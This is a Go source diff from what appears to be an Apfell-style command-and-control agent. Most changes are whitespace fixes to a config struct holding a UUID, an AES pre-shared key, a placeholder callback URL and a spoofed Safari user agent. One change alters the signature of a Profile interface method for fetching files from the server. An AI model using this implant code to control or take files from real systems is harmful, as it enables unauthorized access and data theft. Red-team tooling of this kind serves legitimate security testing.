@@ -13,9 +13,9 @@ import (
 
 // PConfig - Persistent C2 config values
 var PConfig = structs.Mainconfig{
-	"UUID",                           // Unique identifier from Apfell
-	"T",                                    // Key exchange boolean
-	"AESPSK",                         // AES Pre-shared key from Apfell
+	"UUID",                                   // Unique identifier from Apfell
+	"T",                                      // Key exchange boolean
+	"AESPSK",                                 // AES Pre-shared key from Apfell
 	"http(s)://callback_host:callback_port/", // Callback url
 	[]string{},                               // Call back urls
 	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3", // User Agent
@@ -23,7 +23,7 @@ var PConfig = structs.Mainconfig{
 	"",
 }
 
-var seededRand  *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
+var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
 
 const (
 	//CheckInMsg - Messages for apfell
@@ -57,7 +57,7 @@ type Profile interface {
 	PostResponse(task structs.Task, output string) []byte             // Post a task response to the server
 	NegotiateKey() string                                             // Start EKE key negotiation for encrypted comms
 	SendFile(task structs.Task, params string)                        // C2 profile implementation for downloading files
-	GetFile(fileid string) []byte                                     // C2 Profile implementation to get a file with specified id // C2 profile helper function to retrieve any arbitrary value for a profile
+	GetFile(fileDetails structs.FileUploadParams) bool                // C2 Profile implementation to get a file with specified id // C2 profile helper function to retrieve any arbitrary value for a profile
 	SendFileChunks(task structs.Task, data []byte)                    // C2 helper function to upload a file
 	Header() string
 	SetHeader(hostname string)
